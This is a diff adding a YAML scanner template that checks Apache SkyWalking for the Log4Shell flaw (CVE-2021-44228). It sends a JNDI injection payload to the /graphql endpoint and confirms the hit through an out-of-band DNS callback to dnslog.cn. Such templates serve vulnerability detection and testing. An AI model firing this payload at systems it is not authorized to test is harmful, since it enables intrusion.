@@ -1,0 +1,31 @@
+name: Apache SkyWalking Log4shell CVE-2021-44228
+manual: true
+query: ( app="SkyWalking" | title="Skywalking" )
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: http://www.dnslog.cn/getdomain.php
+    expression: response.status == 200
+    output:
+      dnstest: response.body
+  r1:
+    request:
+      method: POST
+      path: /graphql
+      body: '{"query":"${jndi:dns://{{dnstest}}/tea}","variables":{"duration":{"start":"2021-12-22
+        1259","end":"2021-12-22 1314","step":"MINUTE"}}'
+    expression: response.status >= 200
+  r2:
+    request:
+      method: GET
+      path: http://www.dnslog.cn/getrecords.php
+    expression: response.status == 200 && response.body.bcontains(b"{{dnstest}}")
+expression: r0() && r1() && r2()
+detail:
+  author: aetkrad
+  links:
+  - https://gobies.org/
+  description: Apache SkyWalking 存在Log4j漏洞。
+  tags: rce
